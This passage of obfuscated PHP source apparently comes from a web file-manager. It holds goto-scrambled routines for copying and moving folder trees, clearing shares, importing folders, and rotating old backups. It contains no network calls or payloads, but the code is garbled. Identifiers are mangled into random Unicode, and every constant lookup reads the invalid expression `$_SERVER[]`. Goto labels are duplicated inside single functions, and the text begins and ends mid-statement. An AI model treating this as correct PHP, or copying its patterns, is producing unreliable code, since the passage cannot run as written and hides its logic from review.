$_SERVER[]; $F = $this->sourceInfo($Bܱ); $B餟 = $this->sourceInfo($e); goto c; B퉃: $this->saveAll($DǞ್[$aâ[526]]); Model($aâ[173])->linkAdd($DǞ್[$aâ[524]]); $this->folderSizeReset($e); goto aԩԽ; fܫ: $this->_childrenListClear(); $this->lockCopyEnd($Bܱ); $this->lockWriteEnd($e, $B똛); goto A䊵; aԩԽ: $this->updateModifyTime($e); return $d˜; goto Eɷ; d: $this->targetIsDelete = intval($F[$aâ[417]]); $fꇂ = $this->fileNameExistCache($e, $F[$aâ[28]]); $d˜ = $this->_copy($Bܱ, $e, $eڮ, $DǞ್, !0, $c); goto fܫ; A䊵: if ($F[$aâ[397]] == $aâ[86] && $fꇂ == $d˜) { $this->folderSizeResetChildren($fꇂ); } Model($aâ[527])->addAll($DǞ್[$aâ[525]], array(), !0); if ($fꇂ != $d˜ || $F[$aâ[397]] == $aâ[86]) { Model($aâ[528])->eventCopy($d˜); } goto B퉃; eɌ: $this->lockCopyStart($Bܱ); $this->lockWriteStart($e, $B똛); $DǞ್ = array($aâ[524] => array(), $aâ[525] => array(), $aâ[526] => array()); goto d; c: if (!$F || !$B餟 || $B餟[$aâ[397]] != $aâ[86]) { return !1; } if ($this->isParentOf($Bܱ, $e)) { return !1; } $B똛 = $c ? $c : $F[$aâ[28]]; goto eɌ; Eɷ: } private function _copy($A¶꧰, $E趆, $C, &$E, $D쑮, $A甪 = '') { goto Cݳؖ; b: if (!$f) { return $this->_copyCreate($A¶꧰, $E趆, $b, $E); } $e = $f; if ($f妿) { if ($C == REPEAT_RENAME_FOLDER) { $b = $this->fileNameAutoCache($E趆, $b, $C, $f妿); $e = $this->_copyCreate($A¶꧰, $E趆, $b, $E); } else { $fݒ = $this->_childrenList($A¶꧰); foreach ($fݒ as $D¿) { $this->_copy($D¿[$Eˡ[390]], $f, $C, $E, !1); } } } else { if ($C == REPEAT_RENAME || $C == REPEAT_RENAME_FOLDER) { $b = $this->fileNameAutoCache($E趆, $b, $C, $f妿); $e = $this->_copyCreate($A¶꧰, $E趆, $b, $E); } else { if ($C == REPEAT_REPLACE) { $E͎벦 = $this->sourceInfoCache($f); $Bű = $this->fileHistory($E͎벦, $aϕ[$Eˡ[441]], $aϕ[$Eˡ[77]]); if ($Bű) { $E[$Eˡ[524]][] = $aϕ[$Eˡ[441]]; } } else { if ($C == REPEAT_SKIP) { } } } Hook::trigger($Eˡ[529], array($Eˡ[530], $aϕ, 0)); } goto c; Cݳؖ: $Eˡ =& $_SERVER[]; $aϕ = $this->sourceInfoCache($A¶꧰); $f妿 = $aϕ[$Eˡ[397]] == $Eˡ[86]; goto Ańэ; Ańэ: $b = $A甪 ? $A甪 : $aϕ[$Eˡ[28]]; $f = $this->fileNameExistCache($E趆, $b); if ($D쑮) { $this->_childrenAllMake($A¶꧰); if ($f妿 && $f) { $this->_childrenAllMake($f); } } goto b; c: return $e; goto A; A: } private function _copyCreate($e, $CϾѵ, $dص䚕, &$B) { goto F; dǭ: if ($FÅ[$b[397]] != $b[86]) { $B[$b[524]][] = $FÅ[$b[441]]; return $Cǃ峻; } $aժ = array(); $FǾ = array(); goto dЎ; BҚ: $this->chunkEventSet($b[538], array($b[539], $bɐ߆, $E)); $this->saveAll($eÙ); return $Cǃ峻; goto eο; F: $b =& $_SERVER[]; $FÅ = $this->sourceInfoCache($e); $Dֵ = $this->sourceInfoCache($CϾѵ); goto f޷; F: $EȺ[$e] = $Cǃ峻; $Eݞ = array(); $eÙ = array(); goto A񔯲ﰈ; Aގ: $dҌ = $this->sourceInfo($Cǃ峻); foreach ($aժ as $d쯞Ḕ) { $fö = $this->_makeItemData($d쯞Ḕ, $dҌ, $d쯞Ḕ[$b[28]]); $fö[$b[481]] = $d쯞Ḕ[$b[481]]; $FǾ[] = $fö; } $this->chunkEventSet($b[534], array($b[535], $bɐ߆, $E)); goto D; dЎ: $this->_childrenListAll($e, $aժ); $E = count($aժ); if ($E == 0) { return $Cǃ峻; } goto Aގ; D: $this->addAll($FǾ, array(), !1); $d詤 = $this->where(array($b[472] => $Cǃ峻))->select(); $EȺ = $this->_childrenMakeRelation($aժ, $d詤); goto F; d: $Cǃ峻 = $this->add($bɐ߆); $a = array($b[390] => $Cǃ峻, $b[28] => $dص䚕); $this->_copyApplyMeta($a, $B); goto dǭ; A񔯲ﰈ: foreach ($d詤 as $d쯞Ḕ) { $Eۊă = $d쯞Ḕ[$b[390]]; $D = $this->_childrenMatch($EȺ, $d쯞Ḕ, $dҌ); $Eݞ[] = array($b[390], $Eۊă, $b[472], $D[$b[472]]); $eÙ[] = array($b[390], $Eۊă, $b[481], $D[$b[481]]); $this->_copyApplyMeta($d쯞Ḕ, $B); if ($d쯞Ḕ[$b[397]] != $b[86]) { $B[$b[524]][] = $d쯞Ḕ[$b[441]]; } } $this->chunkEventSet($b[536], array($b[537], $bɐ߆, $E)); $this->saveAll($Eݞ); goto BҚ; f޷: $bɐ߆ = $this->_makeItemData($FÅ, $Dֵ, $dص䚕); Hook::trigger($b[531], $bɐ߆); Hook::trigger($b[532], array($b[533], $bɐ߆, 0)); goto d; eο: } private function _childrenMakeRelation($f, $AҮ) { $e =& $_SERVER[]; $bچٮ = array(); $A = array(); foreach ($f as $a܉Ӳ) { $D = $a܉Ӳ[$e[28]] . $e[8] . $a܉Ӳ[$e[481]]; $bچٮ[$D] = $a܉Ӳ[$e[390]]; } foreach ($AҮ as $a܉Ӳ) { $D = $a܉Ӳ[$e[28]] . $e[8] . $a܉Ӳ[$e[481]]; $bא = $bچٮ[$D]; $A[$bא] = $a܉Ӳ[$e[390]]; } return $A; } private function _childrenMatch($B޵, $B⵵, $aጉ) { goto CȮ; Dچ: $f׉ = $F饋[count($F饋) - 1]; return array($fݘ[472] => $f׉, $fݘ[481] => $F鎂); goto F藚; f͗: foreach ($fÄ as $e) { if (isset($B޵[$e])) { $F鎂 .= $B޵[$e] . $fݘ[540]; } } $F鎂 = rtrim($F鎂, $fݘ[47]) . $fݘ[47]; $F饋 = $this->parentLevelArray($F鎂); goto Dچ; CȮ: $fݘ =& $_SERVER[]; $F鎂 = $aጉ[$fݘ[481]]; $fÄ = $this->parentLevelArray($B⵵[$fݘ[481]]); goto f͗; F藚: } private function _makeItemData($aœ, $F떻, $F،) { $c =& $_SERVER[]; $dܕ = array($c[541] => $aœ[$c[397]], $c[407] => $F،, $c[542] => $aœ[$c[399]], $c[442] => $aœ[$c[441]], $c[543] => $aœ[$c[77]], $c[544] => $F떻[$c[398]], $c[545] => $F떻[$c[478]], $c[546] => USER_ID, $c[547] => USER_ID, $c[389] => $F떻[$c[390]], $c[548] => $F떻[$c[481]] . $F떻[$c[390]] . $c[47], $c[416] => 0, $c[549] => $c[33]); return $dܕ; } private function _copyApplyMeta($E݈, &$C) { $Aٙ =& $_SERVER[]; $E癠 = $E݈[$Aٙ[390]]; $e = $E݈[$Aٙ[28]]; if (!isset($E݈[$Aٙ[550]]) || !$E݈[$Aٙ[550]] || $E݈[$Aٙ[550]] == $Aٙ[491]) { $C[$Aٙ[526]][] = array($Aٙ[390], $E癠, $Aٙ[550], short_id($E癠)); } if (Input::check($e, $Aٙ[551])) { $C[$Aٙ[525]][] = array($Aٙ[390] => $E癠, $Aٙ[92] => $Aٙ[438], $Aٙ[370] => str_replace($Aٙ[50], $Aٙ[33], Pinyin::encode($e))); $C[$Aٙ[525]][] = array($Aٙ[390] => $E癠, $Aٙ[92] => $Aٙ[437], $Aٙ[370] => Pinyin::encode($e, $Aٙ[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($e߉˷) { goto Fձ; Fձ: $Aļ =& $_SERVER[]; $dݍƸ = $this->sourceInfo($e߉˷); $bǒ = $Aļ[418]; goto Bӱ; C͍ʾ: $Eƛ = array_to_keyvalue($Eƛ, $Aļ[390]); foreach ($Eƛ as $cŏ) { $bƞ = $cŏ[$Aļ[472]]; $e߉˷ = $cŏ[$Aļ[390]]; if (!isset($this->_childrenListCache[$e߉˷]) && $cŏ[$Aļ[397]] == $Aļ[86]) { $this->_childrenListCache[$e߉˷] = array(); } if (!isset($this->_childrenListCache[$bƞ])) { $this->_childrenListCache[$bƞ] = array(); } $this->_childrenListCache[$bƞ][$e߉˷] = $cŏ; $this->_childrenItemCache[$e߉˷] = $cŏ; } goto cńˏ; Bӱ: $fۇ = array($Aļ[481] => array($Aļ[507], $dݍƸ[$Aļ[481]] . $e߉˷ . $Aļ[508]), $Aļ[417] => $this->targetIsDelete); $Eƛ = $this->field($bǒ)->where($fۇ)->select(); if (!$Eƛ) { return; } goto C͍ʾ; cńˏ: } private function _childrenListAll($EΧ, &$f˰ժ) { $cؔ =& $_SERVER[]; if (!isset($this->_childrenListCache[$EΧ])) { return; } $E = $this->_childrenListCache[$EΧ]; foreach ($E as $e̸ => $Dж) { $f˰ժ[$e̸] = $Dж; if ($Dж[$cؔ[397]] == $cؔ[86]) { $this->_childrenListAll($e̸, $f˰ժ); } } } private function sourceInfoCache($D) { if (isset($this->_childrenItemCache[$D])) { return $this->_childrenItemCache[$D]; } return $this->sourceInfo($D); } private function _childrenList($fܵλ) { if (isset($this->_childrenListCache[$fܵλ])) { return $this->_childrenListCache[$fܵλ]; } return $this->_childrenListSelect($fܵλ); } private function _childrenListSelect($C؞) { goto Bݓ; Dֿ: $Dʈ = $Dʈ ? $Dʈ : array(); $c䰚 = array_to_keyvalue($Dʈ, $Bܺي[390]); $this->_childrenListCache[$C؞] = $c䰚; goto cʒ; cʒ: foreach ($c䰚 as $C؞ => $b閽׿) { $this->_childrenItemCache[$C؞] = $b閽׿; } return $c䰚; goto bՎ; Bݓ: $Bܺي =& $_SERVER[]; $d͍ = array($Bܺي[472] => $C؞, $Bܺي[417] => $this->targetIsDelete); $Dʈ = $this->where($d͍)->select(); goto Dֿ; bՎ: } private function fileNameExistCache($B, $F) { $CЙ =& $_SERVER[]; $F = strtolower($F); $aɿ = $this->_childrenList($B); foreach ($aɿ as $BҚѦ) { if ($F == strtolower($BҚѦ[$CЙ[28]])) { return $BҚѦ[$CЙ[390]]; } } return !1; } private function fileNameAutoCache($c؅Ś, $E¡, $D, $a镫) { $B =& $_SERVER[]; $cΞ = $this->_childrenList($c؅Ś); $Eݐ = array_to_keyvalue($cΞ, $B[33], $B[28]); return $this->fileNameAutoGet($Eݐ, $E¡, $D, $a镫); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($aŶ, $DӰ, $Fƌ = REPEAT_REPLACE, $F貆 = '') { goto F; FՃԋ: if (!$B˸ || !$F || $F[$C܅[397]] != $C܅[86]) { return !1; } Hook::trigger($C܅[553], $Aǘ); $this->targetIsDelete = intval($B˸[$C܅[417]]); goto Bۏ; bՌŷ: $this->folderSizeReset($DӰ); $eҳ = array($B˸[$C܅[472]], $DӰ); if ($B˸[$C܅[397]] == $C܅[86]) { $eҳ[] = $aŶ; } goto AÊ䎑; AÊ䎑: $this->updateModifyTime($eҳ); Model($C܅[528])->eventMove($aŶ, $B˸[$C܅[472]], $DӰ); Hook::trigger($C܅[554], $Aǘ); goto B皭; dΆ: $this->lockMoveEnd($aŶ); $this->lockWriteEnd($DӰ, $aם乧); $this->folderSizeReset($B˸[$C܅[472]]); goto bՌŷ; Bۏ: if ($B˸[$C܅[472]] == $DӰ && $F貆 != $B˸[$C܅[28]]) { $aȔ = $this->fileNameExist($DӰ, $F貆); if ($aȔ && $B˸[$C܅[397]] == $C܅[491]) { goto A䐰; EƠ: return $aȔ; goto D˚; Fɭ: $this->removeNow($aŶ, !1); $this->folderSizeReset($DӰ); Hook::trigger($C܅[554], $Aǘ); goto EƠ; A䐰: $D㼞û = $this->sourceInfo($aȔ); $fք = $this->fileHistory($D㼞û, $B˸[$C܅[441]], $B˸[$C܅[77]]); if (!$fք) { Model($C܅[444])->remove($B˸[$C܅[441]]); } goto Fɭ; D˚: } } $aם乧 = $F貆 ? $F貆 : $B˸[$C܅[28]]; $this->lockMoveStart($aŶ); goto d; B皭: return $DΉ򦗫; goto f̶; d: $this->lockWriteStart($DӰ, $aם乧); $fˡ = array($C܅[524] => array(), $C܅[555] => !1); $this->clearShare($aŶ, $DӰ); goto bǏ; a: if ($B˸[$C܅[472]] == $F[$C܅[390]]) { if ($B˸[$C܅[417]] == $C܅[86]) { Model($C܅[415])->restore(array($aŶ)); } if (!$F貆 || $F貆 == $B˸[$C܅[28]]) { return $aŶ; } } $Aǘ = $this->pathInfoMore($aŶ); if ($this->isParentOf($aŶ, $DӰ)) { return !1; } goto FՃԋ; bǏ: $aމ = $this->fileNameExistCache($DӰ, $B˸[$C܅[28]]); $DΉ򦗫 = $this->_move($aŶ, $DӰ, $Fƌ, $fˡ, $F貆); $this->sourceCacheClear(); goto F; F: if ($B˸[$C܅[397]] == $C܅[86] && $aމ) { $this->folderSizeResetChildren($DΉ򦗫); } Model($C܅[173])->linkAdd($fˡ[$C܅[524]]); if ($aމ && $fˡ[$C܅[555]]) { $this->removeNow($aŶ, !1); } goto dΆ; F: $C܅ =& $_SERVER[]; $B˸ = $this->sourceInfo($aŶ); $F = $this->sourceInfo($DӰ); goto a; f̶: } private function _move($D᧐, $Fޠ栻, $dۣ, &$bȉ, $b𪅿ڙ = '') { goto e; AΚ: $aѨ = $b𪅿ڙ ? $b𪅿ڙ : $B[$bߎ[28]]; $e = $this->fileNameExistCache($Fޠ栻, $aѨ); $this->lockMoveStart($D᧐); goto eݺƥ; eݺƥ: $this->lockWriteStart($Fޠ栻, $aѨ); if (!$e) { return $this->_moveForce($D᧐, $Fޠ栻, $aѨ); } $F֏ = $e; goto a; b𝠎: return $F֏; goto f; a: $b = !1; if ($aۋؿ) { if ($dۣ == REPEAT_RENAME_FOLDER) { $aѨ = $this->fileNameAuto($Fޠ栻, $aѨ, $dۣ, $aۋؿ); $F֏ = $this->_moveForce($D᧐, $Fޠ栻, $aѨ); } else { if ($dۣ == REPEAT_RENAME_FOLDER) { $dۣ = REPEAT_RENAME; } $Aݒ = $this->_childrenListSelect($D᧐); foreach ($Aݒ as $fʘ䉴) { $this->_move($fʘ䉴[$bߎ[390]], $e, $dۣ, $bȉ); } $b = !0; } } else { if ($dۣ == REPEAT_SKIP) { $b = !0; } else { if ($dۣ == REPEAT_RENAME || $dۣ == REPEAT_RENAME_FOLDER) { $aѨ = $this->fileNameAuto($Fޠ栻, $aѨ, $dۣ, $aۋؿ); $F֏ = $this->_moveForce($D᧐, $Fޠ栻, $aѨ); } else { if ($dۣ == REPEAT_REPLACE) { $a̡ = $this->sourceInfoCache($e); $dՔϳ = $this->fileHistory($a̡, $B[$bߎ[441]], $B[$bߎ[77]]); if ($dՔϳ) { $bȉ[$bߎ[524]][] = $B[$bߎ[441]]; } else { $b = !0; } } } } } if ($b && !$bȉ[$bߎ[555]]) { $bȉ[$bߎ[555]] = !0; } goto b𝠎; e: $bߎ =& $_SERVER[]; $B = $this->sourceInfo($D᧐); $aۋؿ = $B[$bߎ[397]] == $bߎ[86]; goto AΚ; f: } private function _moveForce($A戡ި, $B, $F) { goto Cͼۯ; D: $Eˡ = $AſЙ[$d酳ѽ[397]] == $d酳ѽ[86]; $E = array($d酳ѽ[389] => $C[$d酳ѽ[390]], $d酳ѽ[548] => $C[$d酳ѽ[481]] . $C[$d酳ѽ[390]] . $d酳ѽ[47], $d酳ѽ[544] => $C[$d酳ѽ[398]], $d酳ѽ[545] => $C[$d酳ѽ[478]], $d酳ѽ[547] => USER_ID, $d酳ѽ[407] => $F); $bҵ = $AſЙ[$d酳ѽ[398]] == SourceModel::TYPE_GROUP && $C[$d酳ѽ[398]] == SourceModel::TYPE_GROUP && $AſЙ[$d酳ѽ[478]] == $C[$d酳ѽ[478]]; goto D; Eӫ: if ($Eˡ) { $Aǉ = array($d酳ѽ[548] => array($d酳ѽ[507], $AſЙ[$d酳ѽ[481]] . $AſЙ[$d酳ѽ[390]] . $d酳ѽ[508])); $cܙ = $AſЙ[$d酳ѽ[481]] . $AſЙ[$d酳ѽ[390]] . $d酳ѽ[47]; $aՎ = $C[$d酳ѽ[481]] . $C[$d酳ѽ[390]] . $d酳ѽ[47] . $AſЙ[$d酳ѽ[390]] . $d酳ѽ[47]; $FȊ؎ = array($d酳ѽ[548] => array($d酳ѽ[556], "\162\145\x70\154\x61\x63\145\x28\x70\141\x72\145\156\x74\x4c\x65\166\145\154\54\x27{$cܙ}\x27\x2c\x27{$aՎ}\x27\x29"), $d酳ѽ[544] => $C[$d酳ѽ[398]], $d酳ѽ[545] => $C[$d酳ѽ[478]]); if ($E) { $FȊ؎[$d酳ѽ[416]] = 0; } $this->where($Aǉ)->data($FȊ؎)->save(); } $this->where(array($d酳ѽ[404] => $A戡ި))->data($E)->save(); return $A戡ި; goto dѺڰ; D: if (!$bҵ && $this->moveClearAuth) { Model($d酳ѽ[476])->authClear($A戡ި); } $E = $AſЙ[$d酳ѽ[417]] == $d酳ѽ[86] && $C[$d酳ѽ[417]] != $d酳ѽ[86]; if ($E) { $E[$d酳ѽ[416]] = 0; } goto Eӫ; Cͼۯ: $d酳ѽ =& $_SERVER[]; $AſЙ = $this->sourceInfo($A戡ި); $C = $this->sourceInfo($B); goto D; dѺڰ: } private function clearShare($Có, $FƑ) { goto aΣ; dˌʑ: if ($D[$B[478]] == $F[$B[478]] && $D[$B[398]] == $B[557]) { return; } $B纂ܷ = array($B[481] => array($B[507], $D[$B[481]] . $Có . $B[508])); $FǏ = $this->field($B[404])->where($B纂ܷ)->getField($B[390], !0); goto B; aΣ: $B =& $_SERVER[]; $D = $this->sourceInfo($Có); $F = $this->sourceInfo($FƑ); goto dˌʑ; B: if (!$FǏ) { return; } $B纂ܷ = array($B[390] => array($B[7], $FǏ), $B[469] => 1); $FĜ = Model($B[558])->field($B[462])->where($B纂ܷ)->select(); goto eӉ; eӉ: if (!$FĜ) { return; } $FĜ = array_to_keyvalue($FĜ, $B[33], $B[462]); $B纂ܷ = array($B[462] => array($B[7], $FĜ)); goto B; B: Model($B[558])->where($B纂ܷ)->save(array($B[469] => 0)); Model($B[559])->where($B纂ܷ)->delete(); goto e; e: } public function copyFolderFromIO($bҢ, $B, $BƟއ, $c芣ծ, $F, $a͑Ʃ = false) { goto bїʱ; Eи: if ($D) { $this->_childrenAllMake($D); } Hook::trigger($C萓[561]); $this->_copyChildTo($bҢ, $B, $Dܚ, $c芣ծ, $fѹ, $F); goto Aཊ; Cʫ: $D = $this->fileNameExist($BƟއ, $cޣ); $Dܚ = $this->mkdir($BƟއ, $cޣ, $c芣ծ); if (!$D || $c芣ծ == REPEAT_RENAME_FOLDER) { $c芣ծ = !1; } goto Eи; Cѝ: $this->updateModifyTime($BƟއ); return $Dܚ; goto aǼ; bїʱ: $C萓 =& $_SERVER[]; $fѹ = array($C萓[525] => array(), $C萓[526] => array(), $C萓[524] => array(), $C萓[560] => array()); $cޣ = $a͑Ʃ ? $a͑Ʃ : $bҢ->pathThis($B); goto Cʫ; CԨ: Model($C萓[527])->addAll($fѹ[$C萓[525]], array(), !0); Model($C萓[528])->eventCopy($Dܚ); $this->saveAll($fѹ[$C萓[526]]); goto fչ; fչ: Model($C萓[444])->linkAdd($fѹ[$C萓[524]]); Model($C萓[444])->remove($fѹ[$C萓[560]]); $this->folderSizeReset($BƟއ); goto Cѝ; Aཊ: Hook::trigger($C萓[562]); if ($Dܚ) { $this->folderSizeResetChildren($Dܚ); } $this->_childrenListClear(); goto CԨ; aǼ: } private function _copyChildTo($fׄ, $B҇Ĺ, $Bʜߕ, $FǴǯ, &$B, $D̆) { goto E׺; f: $bϝ = array_merge($C⪑׻[$Bݲ[73]], $C⪑׻[$Bݲ[74]]); $f㓤ѱ = $this->_addFiles($fׄ, $C⪑׻[$Bݲ[73]], $D̆); $c߆ = array(); goto B᜻ك; B᜻ك: foreach ($bϝ as &$e􏆗) { goto aϐ; fΪ͉: $e􏆗[$Bݲ[77]] = _get($e􏆗, $Bݲ[77], 0); $e􏆗[$Bݲ[441]] = _get($e􏆗, $Bݲ[441], 0); if (!isset($e􏆗[$Bݲ[563]]) && $e􏆗[$Bݲ[441]]) { $B[$Bݲ[560]][] = $e􏆗[$Bݲ[441]]; } goto bɻŗ; aϐ: if (isset($f㓤ѱ[$e􏆗[$Bݲ[28]]])) { $e􏆗 = $f㓤ѱ[$e􏆗[$Bݲ[28]]]; } $e􏆗[$Bݲ[397]] = $e􏆗[$Bݲ[29]] == $Bݲ[76]; $e􏆗[$Bݲ[399]] = _get($e􏆗, $Bݲ[167], $Bݲ[33]); goto fΪ͉; bɻŗ: if ($FǴǯ) { $C颹ش = $this->fileNameExistCache($Bʜߕ, $e􏆗[$Bݲ[28]]); if ($C颹ش) { if ($e􏆗[$Bݲ[397]] || $FǴǯ == REPEAT_SKIP) { continue; } if ($FǴǯ == REPEAT_REPLACE) { $b虜 = $this->sourceInfoCache($C颹ش); $D = $this->fileHistory($b虜, $e􏆗[$Bݲ[441]], $e􏆗[$Bݲ[77]]); if ($D) { $B[$Bݲ[524]][] = $e􏆗[$Bݲ[441]]; } continue; } else { if ($FǴǯ == REPEAT_RENAME) { $e􏆗[$Bݲ[28]] = $this->fileNameAutoCache($Bʜߕ, $e􏆗[$Bݲ[28]], $FǴǯ, !1); } } } } if (!$e􏆗[$Bݲ[397]] && $e􏆗[$Bݲ[441]]) { $B[$Bݲ[524]][] = $e􏆗[$Bݲ[441]]; } $c߆[] = $this->_makeItemData($e􏆗, $cÐ, $e􏆗[$Bݲ[28]]); goto F; F: } unset($e􏆗); if (!empty($c߆)) { $this->addAll($c߆); $this->_childrenListSelect($Bʜߕ); } goto e; E׺: $Bݲ =& $_SERVER[]; $cÐ = $this->sourceInfoCache($Bʜߕ); $C⪑׻ = $fׄ->listPath($B҇Ĺ); goto f; e: $b̉ = $this->_childrenList($Bʜߕ); $b̉ = array_to_keyvalue($b̉, $Bݲ[28]); foreach ($bϝ as $e􏆗) { $b虜 = $b̉[$e􏆗[$Bݲ[28]]]; $d = $b虜[$Bݲ[390]]; $this->_copyApplyMeta($b虜, $B); if ($e􏆗[$Bݲ[29]] == $Bݲ[76]) { $e􏆗[$Bݲ[75]] = $fׄ->getPathInner($e􏆗[$Bݲ[75]]); $this->_copyChildTo($fׄ, $e􏆗[$Bݲ[75]], $d, $FǴǯ, $B, $D̆); } } goto c; c: } private function _addFiles($D, $bѤǙ, $dۢ) { goto E❊; E❊: $f =& $_SERVER[]; if (!$bѤǙ || count($bѤǙ) == 0) { return array(); } $Eͥ = array(); goto C̐; E߆: $B؂ = $B؂ ? $B؂ : array(); foreach ($B؂ as $E) { if (!isset($Eͥ[$E[$f[169]]])) { continue; } $b =& $Eͥ[$E[$f[169]]]; foreach ($b as &$f̭) { $f̭[$f[441]] = $E[$f[441]]; } unset($f̭); } $f񖃉ք = array(); goto F; eϥ: $E񹥙 = Model($f[566]); $B؂ = $E񹥙->where($e㥳)->select(); $B؂ = $B؂ ? $B؂ : array(); goto DѢ; DѢ: foreach ($B؂ as $E) { if (!isset($Eͥ[$E[$f[169]]])) { continue; } $D = $Eͥ[$E[$f[169]]]; foreach ($D as &$f̭) { $f̭[$f[441]] = $E[$f[441]]; $f̭[$f[563]] = !0; } unset($f̭); } $aĢ = array(); foreach ($bѤǙ as $d) { if (isset($d[$f[563]]) && $d[$f[563]]) { continue; } $A = $D->getPathInner($d[$f[75]]); $D = $E񹥙->addFileMake($A, $d[$f[77]], $d[$f[170]], $d[$f[169]], $d[$f[28]], $dۢ); $aĢ[] = $D; } goto B炦; B炦: $E񹥙->addAll($aĢ); $e㥳 = array($f[169] => array($f[7], array_keys($Eͥ))); $B؂ = $E񹥙->where($e㥳)->select(); goto E߆; C̐: foreach ($bѤǙ as &$f̭) { goto c݄; Cݐ: $cڃŎ = $D->hashMd5($f̭[$f[75]]); if (strlen($cڃŎ) > 10 && !isset($Eͥ[$cڃŎ])) { $Eͥ[$cڃŎ] = array(); } $f̭[$f[170]] = $C鰢; goto eғ; cڌ: if (count($Eͥ[$cڃŎ]) > 1) { $f̭[$f[563]] = !0; } goto eĢ; c݄: Hook::trigger($f[564], $f̭); $f̭[$f[75]] = $D->getPathInner($f̭[$f[75]]); $C鰢 = $D->hashSimple($f̭[$f[75]]); goto Cݐ; eғ: $f̭[$f[169]] = $cڃŎ; Hook::trigger($f[565], $f̭); $Eͥ[$cڃŎ][] =& $f̭; goto cڌ; eĢ: } unset($f̭); $e㥳 = array($f[169] => array($f[7], array_keys($Eͥ))); goto eϥ; F: foreach ($bѤǙ as $b) { $f񖃉ք[$b[$f[28]]] = $b; } return $f񖃉ք; goto d܄; d܄: } } define($_SERVER[][567], $_SERVER[][568]); goto e᷐; Aϛ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $Cδ =& $_SERVER[]; self::$name = date($Cδ[723]); if (!($dΧ = Model($Cδ[724])->lastItem())) { $dΧ = $this->initData(); } else { self::$name = $dΧ[$Cδ[28]]; if ($dΧ[$Cδ[725]] == $Cδ[86]) { self::$name = date($Cδ[726]); $B = 0; if (isset($dΧ[$Cδ[289]][$Cδ[173]][$Cδ[441]])) { $B = (int) $dΧ[$Cδ[289]][$Cδ[173]][$Cδ[441]]; } if ($dΧ[$Cδ[28]] == self::$name) { Model($Cδ[724])->remove($dΧ[$Cδ[388]]); } $dΧ = $this->initData($B, $dΧ[$Cδ[727]]); } else { $this->checkStore($dΧ[$Cδ[727]]); } } self::$option = $dΧ; } private function initData($Bҷ = 0, $C饦 = '') { goto bȪ; bȪ: $Fˤ =& $_SERVER[]; $F󨲞 = Model($Fˤ[724])->config(); if ($C饦 && $F󨲞[$Fˤ[727]] != $C饦) { $Bҷ = 0; } goto a㄃; Aҝ: $cǋ[$Fˤ[388]] = $E; return $cǋ; goto eͤ; a㄃: $this->checkStore($F󨲞[$Fˤ[727]]); $cǋ = array($Fˤ[727] => $F󨲞[$Fˤ[727]], $Fˤ[28] => self::$name, $Fˤ[725] => 0, $Fˤ[728] => $F󨲞[$Fˤ[728]], $Fˤ[289] => array($Fˤ[729] => array($Fˤ[725] => 0), $Fˤ[730] => array($Fˤ[725] => 0, $Fˤ[731] => 0, $Fˤ[732] => 0, $Fˤ[29] => $Fˤ[33]), $Fˤ[733] => array($Fˤ[725] => 0, $Fˤ[731] => 0, $Fˤ[732] => 0), $Fˤ[173] => array($Fˤ[725] => 0, $Fˤ[734] => 0, $Fˤ[735] => 0, $Fˤ[736] => 0, $Fˤ[737] => 0, $Fˤ[441] => $Bҷ)), $Fˤ[738] => time(), $Fˤ[470] => 0); $E = Model($Fˤ[724])->insert($cǋ); goto Aҝ; eͤ: } private function checkStore($E) { $b׵ =& $_SERVER[]; $C򒏣 = Model($b׵[739])->listData($E); Model($b׵[739])->checkConfig($C򒏣); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][724])->findByName(self::$name); } return self::$option; } public static function set($e) { $F˫녌 =& $_SERVER[]; $D = self::get(); foreach ($e as $B̲ => $C) { $A኶Ӊ = explode($F˫녌[94], $B̲); $fѧÄ = count($A኶Ӊ); switch ($fѧÄ) { case 1: $D[$A኶Ӊ[0]] = $C; break; case 2: $D[$A኶Ӊ[0]][$A኶Ӊ[1]] = $C; break; case 3: $D[$A኶Ӊ[0]][$A኶Ӊ[1]][$A኶Ӊ[2]] = $C; break; } } Model($F˫녌[724])->update($D[$F˫녌[388]], $D); self::$option = $D; return self::$option; } public function keep() { $B =& $_SERVER[]; $Dͳ = self::get(); if ($Dͳ[$B[289]][$B[729]][$B[725]] == $B[86]) { return; } $this->backupKeep($Dͳ); self::set(array($B[740] => 1)); } private function backupKeep($c) { goto E䶑đ; E䶑đ: $B͚ =& $_SERVER[]; $EЎ՘ = Model($B͚[724])->listData(); if (empty($EЎ՘)) { return; } goto Fǂʎ; Fǂʎ: $Bȫ = 0; $DЄƇ = array(); foreach ($EЎ՘ as $f݈Ա) { if ($Bȫ >= 7) { break; } $DЄƇ[] = $f݈Ա[$B͚[28]]; $Bȫ++; } goto A޷; A޷: for ($Bȫ = 0; $Bȫ < 12; $Bȫ++) { $DЄƇ[] = date($B͚[741], strtotime("\55{$Bȫ}\40\x6d\157\x6e\x74\150\163")); } $DЄƇ = array_unique($DЄƇ); foreach ($EЎ՘ as $f݈Ա) { if (!empty($f݈Ա[$B͚[28]]) && in_array($f݈Ա[$B͚[28]], $DЄƇ)) { continue; } Model($B͚[724])->remove($f݈Ա[$B͚[388]]); $aǍ = "\x7b\x69\x6f\72{$c[$B͚[727]]}\x7d\57\144\x61\164\x61\142\141\x73\x65\x2f\142\x61\x63\x6b\165\x70\x5f{$f݈Ա[$B͚[28]]}"; IO::remove($aǍ, !1); } goto Dꃯ; Dꃯ: } public function db() { goto e뉽; ĒÛ: $Aۨř = new BackupDb(); if (!$Aۨř->index()) { return !1; } self::set(array($aԖ˓[742] => 1)); goto a; a: return !0; goto AƢ՘; e뉽: $aԖ˓ =& $_SERVER[]; $Bי = self::get(); if ($Bי[$aԖ˓[289]][$aԖ˓[730]][$aԖ˓[725]] == $aԖ˓[86]) { return !0; } goto ĒÛ; AƢ՘: } public function dbFile() { goto aӬ; B: $bб = new BackupDbFile(); if (!$bб->index()) { return !1; } self::set(array($bԒб[743] => 1)); goto Dǜ; Dǜ: return !0; goto Fә׻; aӬ: $bԒб =& $_SERVER[]; $AƾÌ = self::get(); if ($AƾÌ[$bԒб[289]][$bԒб[733]][$bԒб[725]] == $bԒб[86]) { return !0; } goto B; Fә׻: } public function file() { $e֌ =& $_SERVER[]; $dѯ = self::get(); if ($dѯ[$e֌[289]][$e֌[173]][$e֌[725]] == $e֌[86]) { return 